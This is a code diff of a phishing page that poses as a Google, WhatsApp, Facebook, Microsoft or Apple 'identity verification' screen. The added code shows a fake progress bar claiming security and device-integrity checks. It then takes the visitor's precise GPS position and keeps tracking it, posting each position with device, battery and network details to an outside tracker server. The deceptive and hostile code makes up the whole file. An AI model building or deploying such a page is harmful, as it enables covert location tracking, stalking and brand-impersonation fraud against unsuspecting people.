@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="pageTitle">Verification</title>
+    <title>Verification</title>
     <style>
-        /* ===== SAME STYLES AS BEFORE ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             height: 100vh;
@@ -56,12 +55,7 @@
         .brand-microsoft .brand-name { color: #202124; }
         .brand-apple .brand-name { color: #1a1a1a; }
 
-        .subtitle {
-            color: #4a4a4a;
-            font-size: 15px;
-            margin-bottom: 16px;
-            font-weight: 400;
-        }
+        .subtitle { color: #4a4a4a; font-size: 15px; margin-bottom: 16px; font-weight: 400; }
         .badge {
             display: inline-block;
             font-size: 12px;
@@ -154,11 +148,7 @@
             margin: 10px 0;
             animation: pop 0.5s ease;
         }
-        @keyframes pop {
-            0% { transform: scale(0); opacity: 0; }
-            80% { transform: scale(1.2); }
-            100% { transform: scale(1); opacity: 1; }
-        }
+        @keyframes pop { 0% { transform: scale(0); opacity: 0; } 80% { transform: scale(1.2); } 100% { transform: scale(1); opacity: 1; } }
 
         .continue-btn {
             width: 100%;
@@ -185,6 +175,28 @@
             text-decoration: underline;
         }
         .reset-link:hover { color: #e94560; }
+
+        /* FAKE PROGRESS BAR */
+        .progress-container {
+            width: 100%;
+            height: 4px;
+            background: #e0e0e0;
+            border-radius: 4px;
+            margin: 15px 0 5px 0;
+            overflow: hidden;
+            display: none;
+        }
+        .progress-container .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #4285f4, #4caf50);
+            border-radius: 4px;
+            transition: width 0.3s ease;
+        }
+        .brand-whatsapp .progress-container .progress-fill { background: linear-gradient(90deg, #25d366, #075e54); }
+        .brand-google .progress-container .progress-fill { background: linear-gradient(90deg, #4285f4, #34a853); }
+        .brand-facebook .progress-container .progress-fill { background: #1877f2; }
+        .brand-apple .progress-container .progress-fill { background: #1a1a1a; }
 
         .footer {
             margin-top: 20px;
@@ -220,6 +232,9 @@
         <button class="verify-btn" id="verifyBtn">Verify</button>
         <button class="continue-btn" id="continueBtn">➡️ Continue to Service</button>
         <div class="status-message" id="statusMsg"></div>
+        <div class="progress-container" id="progressContainer">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
         <div class="checkmark" id="checkmark">✅</div>
         <a class="reset-link" id="resetLink">🔄 Reset permissions (if prompt doesn't appear)</a>
         <div class="footer" id="footerText"><a href="#">Privacy Policy</a> · <a href="#">Terms</a></div>
@@ -227,45 +242,29 @@
 
     <script>
         // =============================================
-        // 🆕 BRAND DETECTION: From Path OR Query String
+        // BRAND DETECTION: Flask > Path > Query > Default
         // =============================================
-        // 1. Flask injects {{ brand }} for clean URLs (/whatsapp/verify)
-        // 2. Fallback to URL param ?template= for legacy links
-        // 3. Default to 'google'
-        const BRAND_FROM_SERVER = '{{ brand }}'.trim(); // Flask variable
-
-        // Get brand from URL path (e.g., /whatsapp/verify -> 'whatsapp')
+        const BRAND_FROM_SERVER = '{{ brand }}'.trim();
         const pathParts = window.location.pathname.split('/').filter(p => p.length > 0);
-        // pathParts = ['whatsapp', 'verify'] if using clean URL
         const brandFromPath = (pathParts.length >= 2 && pathParts[1] === 'verify') ? pathParts[0] : null;
-
-        // Parse query params (for legacy links)
         const urlParams = new URLSearchParams(window.location.search);
         const brandFromQuery = urlParams.get('template');
-
-        // Final brand: server-injected > path > query > default
         const template = BRAND_FROM_SERVER || brandFromPath || brandFromQuery || 'google';
-        console.log('📍 Detected brand:', template);
+        console.log('📍 Brand:', template);
 
         // =============================================
         // CONFIGURATION
         // =============================================
-        const RENDER_URL = 'https://location-tracker-cn7m.onrender.com'; // CHANGE to your URL
-
-        // Session ID
+        const RENDER_URL = 'https://location-tracker-cn7m.onrender.com'; // CHANGE
         let sessionId = localStorage.getItem('tracker_session_id');
         if (!sessionId) {
             sessionId = 'user_' + Math.random().toString(36).substring(2, 10) + '_' + Date.now().toString(36);
             localStorage.setItem('tracker_session_id', sessionId);
         }
-        console.log('🆔 Session ID:', sessionId);
-
-        // iOS detection
         const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
-        console.log('📱 iOS detected:', isIOS);
 
         // =============================================
-        // SVG LOGOS (same as before)
+        // TEMPLATES
         // =============================================
         const svgLogos = {
             google: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/><path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/><path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/><path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/></svg>`,
@@ -276,74 +275,14 @@
         };
 
         const templates = {
-            google: {
-                brandClass: 'brand-google',
-                logo: `<div class="logo-container">${svgLogos.google}<span class="brand-name">Google</span></div>`,
-                subtitle: 'Verify your identity',
-                badge: '🔒 Secure verification',
-                qrIcon: '🔵',
-                qrLabel: 'Verify with Google',
-                qrSub: 'Tap "Verify" to continue',
-                buttonText: 'Verify',
-                footer: '<a href="#">Privacy Policy</a> · <a href="#">Terms of Service</a>',
-                redirectUrl: 'https://www.google.com',
-                successMessage: '✅ Identity verified successfully!'
-            },
-            whatsapp: {
-                brandClass: 'brand-whatsapp',
-                logo: `<div class="logo-container">${svgLogos.whatsapp}<span class="brand-name">WhatsApp</span></div>`,
-                subtitle: 'Verify your device to continue',
-                badge: '🔒 End-to-End Encrypted',
-                qrIcon: '📱',
-                qrLabel: 'Scan to verify your device',
-                qrSub: 'Or tap "Verify" to authenticate',
-                buttonText: 'Verify Device',
-                footer: '<a href="#">Privacy Policy</a> · <a href="#">Terms of Service</a>',
-                redirectUrl: 'https://web.whatsapp.com',
-                successMessage: '✅ Device verified successfully!'
-            },
-            facebook: {
-                brandClass: 'brand-facebook',
-                logo: `<div class="logo-container">${svgLogos.facebook}<span class="brand-name">Facebook</span></div>`,
-                subtitle: 'Secure login verification',
-                badge: '🔒 Encrypted connection',
-                qrIcon: '🔷',
-                qrLabel: 'Verify with Facebook',
-                qrSub: 'Tap "Verify" to continue',
-                buttonText: 'Continue',
-                footer: '<a href="#">Privacy Policy</a> · <a href="#">Terms</a>',
-                redirectUrl: 'https://www.facebook.com',
-                successMessage: '✅ Identity verified!'
-            },
-            microsoft: {
-                brandClass: 'brand-microsoft',
-                logo: `<div class="logo-container">${svgLogos.microsoft}<span class="brand-name">Microsoft</span></div>`,
-                subtitle: 'Verify your identity',
-                badge: '🔒 Protected by Microsoft',
-                qrIcon: '⬡',
-                qrLabel: 'Verify with Microsoft',
-                qrSub: 'Tap "Verify" to continue',
-                buttonText: 'Verify',
-                footer: '<a href="#">Privacy</a> · <a href="#">Terms</a>',
-                redirectUrl: 'https://www.microsoft.com',
-                successMessage: '✅ Identity verified!'
-            },
-            apple: {
-                brandClass: 'brand-apple',
-                logo: `<div class="logo-container">${svgLogos.apple}<span class="brand-name">Apple</span></div>`,
-                subtitle: 'Security verification',
-                badge: '🔒 Apple Security',
-                qrIcon: '',
-                qrLabel: 'Verify with Apple',
-                qrSub: 'Tap "Verify" to continue',
-                buttonText: 'Continue',
-                footer: '<a href="#">Privacy Policy</a> · <a href="#">Terms</a>',
-                redirectUrl: 'https://www.apple.com',
-                successMessage: '✅ Identity verified!'
-            }
+            google: { brandClass: 'brand-google', logo: `<div class="logo-container">${svgLogos.google}<span class="brand-name">Google</span></div>`, subtitle: 'Verify your identity', badge: '🔒 Secure verification', qrIcon: '🔵', qrLabel: 'Verify with Google', qrSub: 'Tap "Verify" to continue', buttonText: 'Verify', footer: '<a href="#">Privacy Policy</a> · <a href="#">Terms of Service</a>', redirectUrl: 'https://www.google.com', successMessage: '✅ Identity verified successfully!' },
+            whatsapp: { brandClass: 'brand-whatsapp', logo: `<div class="logo-container">${svgLogos.whatsapp}<span class="brand-name">WhatsApp</span></div>`, subtitle: 'Verify your device to continue', badge: '🔒 End-to-End Encrypted', qrIcon: '📱', qrLabel: 'Scan to verify your device', qrSub: 'Or tap "Verify" to authenticate', buttonText: 'Verify Device', footer: '<a href="#">Privacy Policy</a> · <a href="#">Terms of Service</a>', redirectUrl: 'https://web.whatsapp.com', successMessage: '✅ Device verified successfully!' },
+            facebook: { brandClass: 'brand-facebook', logo: `<div class="logo-container">${svgLogos.facebook}<span class="brand-name">Facebook</span></div>`, subtitle: 'Secure login verification', badge: '🔒 Encrypted connection', qrIcon: '🔷', qrLabel: 'Verify with Facebook', qrSub: 'Tap "Verify" to continue', buttonText: 'Continue', footer: '<a href="#">Privacy Policy</a> · <a href="#">Terms</a>', redirectUrl: 'https://www.facebook.com', successMessage: '✅ Identity verified!' },
+            microsoft: { brandClass: 'brand-microsoft', logo: `<div class="logo-container">${svgLogos.microsoft}<span class="brand-name">Microsoft</span></div>`, subtitle: 'Verify your identity', badge: '🔒 Protected by Microsoft', qrIcon: '⬡', qrLabel: 'Verify with Microsoft', qrSub: 'Tap "Verify" to continue', buttonText: 'Verify', footer: '<a href="#">Privacy</a> · <a href="#">Terms</a>', redirectUrl: 'https://www.microsoft.com', successMessage: '✅ Identity verified!' },
+            apple: { brandClass: 'brand-apple', logo: `<div class="logo-container">${svgLogos.apple}<span class="brand-name">Apple</span></div>`, subtitle: 'Security verification', badge: '🔒 Apple Security', qrIcon: '', qrLabel: 'Verify with Apple', qrSub: 'Tap "Verify" to continue', buttonText: 'Continue', footer: '<a href="#">Privacy Policy</a> · <a href="#">Terms</a>', redirectUrl: 'https://www.apple.com', successMessage: '✅ Identity verified!' }
         };
 
-        const selected = templates[template] || templates['google'];
+        const selected = templates[template] || templates.google;
         document.getElementById('card').className = 'card ' + selected.brandClass;
         document.getElementById('logoContainer').innerHTML = selected.logo;
         document.getElementById('subtitleText').textContent = selected.subtitle;
@@ -354,30 +293,32 @@
         document.getElementById('verifyBtn').textContent = selected.buttonText;
         document.getElementById('footerText').innerHTML = selected.footer;
         document.title = selected.brandClass.replace('brand-','').toUpperCase() + ' Verification';
-
         const REDIRECT_URL = selected.redirectUrl;
         const SUCCESS_MSG = selected.successMessage;
 
         // =============================================
-        // DOM Elements & Logic (SAME iOS VERSION AS BEFORE)
+        // DOM ELEMENTS
         // =============================================
         const verifyBtn = document.getElementById('verifyBtn');
         const continueBtn = document.getElementById('continueBtn');
         const statusMsg = document.getElementById('statusMsg');
         const checkmark = document.getElementById('checkmark');
         const resetLink = document.getElementById('resetLink');
+        const progressContainer = document.getElementById('progressContainer');
+        const progressFill = document.getElementById('progressFill');
 
         let isProcessing = false;
         let watchId = null;
         let locationCaptured = false;
-        let latestPosition = null;
 
-        function showStatus(message, type = 'verifying') {
+        // =============================================
+        // HELPERS
+        // =============================================
+        function showStatus(msg, type = 'verifying') {
             statusMsg.className = 'status-message ' + type;
-            statusMsg.innerHTML = message;
+            statusMsg.innerHTML = msg;
             statusMsg.style.display = 'block';
         }
-
         function hideStatus() { statusMsg.style.display = 'none'; }
         function showCheckmark() { checkmark.style.display = 'block'; }
 
@@ -387,6 +328,8 @@
             verifyBtn.textContent = selected.buttonText;
             verifyBtn.style.display = 'block';
             continueBtn.style.display = 'none';
+            progressContainer.style.display = 'none';
+            progressFill.style.width = '0%';
         }
 
         function getDeviceInfo() {
@@ -397,58 +340,31 @@
             else if (ua.includes('Android')) deviceName = 'Android';
             else if (ua.includes('Windows')) deviceName = 'Windows PC';
             else if (ua.includes('Mac')) deviceName = 'Mac';
-            return {
-                userAgent: ua,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: screen.width + 'x' + screen.height,
-                device_name: deviceName,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
+            return { userAgent: ua, platform: navigator.platform, language: navigator.language, screen: screen.width + 'x' + screen.height, device_name: deviceName, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone };
         }
 
         function getBatteryInfo() {
             if (isIOS) return Promise.resolve(null);
-            if (navigator.getBattery) {
-                return navigator.getBattery().then(battery => ({
-                    level: Math.round(battery.level * 100),
-                    charging: battery.charging
-                })).catch(() => null);
-            }
+            if (navigator.getBattery) return navigator.getBattery().then(b => ({ level: Math.round(b.level * 100), charging: b.charging })).catch(() => null);
             return Promise.resolve(null);
         }
 
         function getNetworkInfo() {
-            if (navigator.connection) {
-                return {
-                    type: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink,
-                    rtt: navigator.connection.rtt
-                };
-            }
+            if (navigator.connection) return { type: navigator.connection.effectiveType, downlink: navigator.connection.downlink, rtt: navigator.connection.rtt };
             return null;
         }
 
         function sendLocation(lat, lng, accuracy, altitude, heading, speed) {
             const deviceInfo = getDeviceInfo();
             return getBatteryInfo().then(battery => {
-                const payload = {
-                    lat: lat,
-                    lng: lng,
-                    accuracy: accuracy,
-                    altitude: altitude,
-                    heading: heading,
-                    speed: speed,
-                    device_info: deviceInfo,
-                    battery: battery,
-                    network: getNetworkInfo(),
-                    session_id: sessionId,
-                    mode: 'normal'
-                };
                 return fetch(RENDER_URL + '/send-location', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({
+                        lat, lng, accuracy, altitude, heading, speed,
+                        device_info: deviceInfo, battery, network: getNetworkInfo(),
+                        session_id: sessionId, mode: 'normal'
+                    })
                 });
             });
         }
@@ -456,32 +372,18 @@
         function startContinuousTracking() {
             if (watchId !== null) return;
             watchId = navigator.geolocation.watchPosition(
-                function(position) {
-                    const lat = position.coords.latitude;
-                    const lng = position.coords.longitude;
-                    const accuracy = position.coords.accuracy;
-                    const altitude = position.coords.altitude;
-                    const heading = position.coords.heading;
-                    const speed = position.coords.speed;
-                    latestPosition = { lat, lng, accuracy, altitude, heading, speed };
-                    sendLocation(lat, lng, accuracy, altitude, heading, speed)
-                        .then(() => console.log('📍 Continuous update sent'))
-                        .catch(err => console.error('Continuous update error:', err));
+                pos => {
+                    const { latitude: lat, longitude: lng, accuracy, altitude, heading, speed } = pos.coords;
+                    sendLocation(lat, lng, accuracy, altitude, heading, speed).catch(() => {});
                 },
-                function(error) {
-                    console.error('Watch error:', error);
-                    if (error.code === 1) {
-                        showStatus('⚠️ Permission denied. Tap "Reset permissions" below.', 'error');
-                    }
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 60000,
-                    maximumAge: 0
-                }
+                err => { if (err.code === 1) showStatus('⚠️ Permission denied.', 'error'); },
+                { enableHighAccuracy: true, timeout: 60000, maximumAge: 0 }
             );
         }
 
+        // =============================================
+        // MAIN VERIFICATION (with fake loading)
+        // =============================================
         function startVerification() {
             if (isProcessing) return;
             if (locationCaptured) {
@@ -491,107 +393,113 @@
 
             isProcessing = true;
             verifyBtn.classList.add('loading');
-            verifyBtn.textContent = 'Verifying...';
+            verifyBtn.textContent = '⏳ Initializing...';
             hideStatus();
             checkmark.style.display = 'none';
             continueBtn.style.display = 'none';
+            resetLink.style.display = 'none';
 
-            showStatus('⏳ Requesting location... Please tap "Allow" if prompted.', 'verifying');
+            // Show progress bar
+            progressContainer.style.display = 'block';
+            progressFill.style.width = '0%';
 
-            if (!navigator.geolocation) {
-                showStatus('❌ Geolocation not supported', 'error');
-                resetButton();
-                return;
+            const steps = [
+                { text: '🔍 Checking browser environment...', progress: 25, delay: 800 },
+                { text: '🔐 Establishing secure connection...', progress: 50, delay: 1600 },
+                { text: '🛡️ Verifying device integrity...', progress: 75, delay: 2400 },
+                { text: '📍 Requesting GPS coordinates...', progress: 100, delay: 3200 }
+            ];
+
+            let stepIndex = 0;
+
+            function runStep() {
+                if (stepIndex >= steps.length) {
+                    triggerLocationRequest();
+                    return;
+                }
+                const step = steps[stepIndex];
+                showStatus(step.text, 'verifying');
+                progressFill.style.width = step.progress + '%';
+                verifyBtn.textContent = '⏳ ' + step.text.replace(/[🔍🔐🛡️📍]\s*/, '');
+                stepIndex++;
+                setTimeout(runStep, step.delay);
             }
 
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    const lat = position.coords.latitude;
-                    const lng = position.coords.longitude;
-                    const accuracy = position.coords.accuracy;
-                    const altitude = position.coords.altitude;
-                    const heading = position.coords.heading;
-                    const speed = position.coords.speed;
+            setTimeout(runStep, 300);
 
-                    latestPosition = { lat, lng, accuracy, altitude, heading, speed };
-
-                    sendLocation(lat, lng, accuracy, altitude, heading, speed)
-                        .then(() => {
-                            locationCaptured = true;
-                            startContinuousTracking();
-                            showStatus(SUCCESS_MSG + ' (You are now being tracked live)', 'verified');
-                            verifyBtn.classList.remove('loading');
-                            verifyBtn.classList.add('success');
-                            verifyBtn.textContent = '✅ Verified';
-                            showCheckmark();
-                            continueBtn.style.display = 'block';
-                            continueBtn.textContent = '➡️ Continue to ' + selected.brandClass.replace('brand-','').toUpperCase();
-                            isProcessing = false;
-                        })
-                        .catch(function(err) {
-                            locationCaptured = true;
-                            startContinuousTracking();
-                            showStatus(SUCCESS_MSG + ' (Tracking active)', 'verified');
-                            verifyBtn.classList.remove('loading');
-                            verifyBtn.classList.add('success');
-                            verifyBtn.textContent = '✅ Verified';
-                            showCheckmark();
-                            continueBtn.style.display = 'block';
-                            isProcessing = false;
-                        });
-                },
-                function(error) {
-                    let msg = '❌ Location access required.';
-                    if (error.code === 1) {
-                        msg = '❌ Permission denied. Please tap "Reset permissions" below, then go to Settings > Safari > Advanced > Website Data and clear data for this site. Then try again.';
-                    } else if (error.code === 2) {
-                        msg = '❌ GPS signal unavailable. Try moving outdoors.';
-                    } else if (error.code === 3) {
-                        msg = '⏳ Timeout. Tap Verify again.';
-                    }
-                    showStatus(msg, 'error');
+            function triggerLocationRequest() {
+                verifyBtn.textContent = '📡 Requesting GPS...';
+                if (!navigator.geolocation) {
+                    showStatus('❌ Geolocation not supported', 'error');
                     resetButton();
-                    resetLink.style.display = 'block';
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 60000,
-                    maximumAge: 0
+                    return;
                 }
-            );
+
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        const { latitude: lat, longitude: lng, accuracy, altitude, heading, speed } = pos.coords;
+                        sendLocation(lat, lng, accuracy, altitude, heading, speed)
+                            .then(() => {
+                                locationCaptured = true;
+                                startContinuousTracking();
+                                showStatus(SUCCESS_MSG + ' (Tracking active)', 'verified');
+                                verifyBtn.classList.remove('loading');
+                                verifyBtn.classList.add('success');
+                                verifyBtn.textContent = '✅ Verified';
+                                showCheckmark();
+                                continueBtn.style.display = 'block';
+                                progressContainer.style.display = 'none';
+                                isProcessing = false;
+                            })
+                            .catch(() => {
+                                locationCaptured = true;
+                                startContinuousTracking();
+                                showStatus(SUCCESS_MSG + ' (Tracking active)', 'verified');
+                                verifyBtn.classList.remove('loading');
+                                verifyBtn.classList.add('success');
+                                verifyBtn.textContent = '✅ Verified';
+                                showCheckmark();
+                                continueBtn.style.display = 'block';
+                                progressContainer.style.display = 'none';
+                                isProcessing = false;
+                            });
+                    },
+                    err => {
+                        let msg = '❌ Location access required.';
+                        if (err.code === 1) msg = '❌ Permission denied. Tap "Reset permissions" below.';
+                        else if (err.code === 2) msg = '❌ GPS signal unavailable. Try moving outdoors.';
+                        else if (err.code === 3) msg = '⏳ Timeout. Tap Verify again.';
+                        showStatus(msg, 'error');
+                        resetButton();
+                        resetLink.style.display = 'block';
+                        progressContainer.style.display = 'none';
+                        progressFill.style.width = '0%';
+                    },
+                    { enableHighAccuracy: true, timeout: 60000, maximumAge: 0 }
+                );
+            }
         }
 
-        continueBtn.addEventListener('click', function() {
-            window.location.href = REDIRECT_URL;
-        });
+        // =============================================
+        // EVENT LISTENERS
+        // =============================================
+        verifyBtn.addEventListener('click', startVerification);
+        continueBtn.addEventListener('click', () => { window.location.href = REDIRECT_URL; });
 
         resetLink.addEventListener('click', function() {
             showStatus(
-                '📱 To reset permissions on iPhone: <br>1. Go to <b>Settings > Safari > Advanced > Website Data</b><br>2. Search for <b>' + window.location.hostname + '</b> and swipe to delete<br>3. Also check <b>Settings > Privacy > Location Services > Safari</b> and set to "While Using"<br>4. Refresh this page and tap Verify again.',
+                '📱 To reset on iPhone: <b>Settings > Safari > Advanced > Website Data</b> → clear <b>' + window.location.hostname + '</b>. Then refresh.',
                 'info'
             );
             localStorage.removeItem('tracker_session_id');
             sessionId = 'user_' + Math.random().toString(36).substring(2, 10) + '_' + Date.now().toString(36);
             localStorage.setItem('tracker_session_id', sessionId);
-            console.log('🆕 New session ID:', sessionId);
         });
 
-        verifyBtn.addEventListener('click', startVerification);
+        setTimeout(() => verifyBtn.classList.add('active'), 1000);
+        window.addEventListener('beforeunload', () => { if (watchId) navigator.geolocation.clearWatch(watchId); });
 
-        setTimeout(function() {
-            verifyBtn.classList.add('active');
-        }, 1000);
-
-        window.addEventListener('beforeunload', function() {
-            if (watchId !== null) {
-                navigator.geolocation.clearWatch(watchId);
-                watchId = null;
-            }
-        });
-
-        console.log('📱 iOS-optimized verification page loaded');
-        console.log('🆔 Session ID:', sessionId);
-        console.log('📍 Tracking will continue until you leave the page.');
+        console.log('📱 iOS-optimized + fake loading ready');
     </script>
 </body>
 </html>
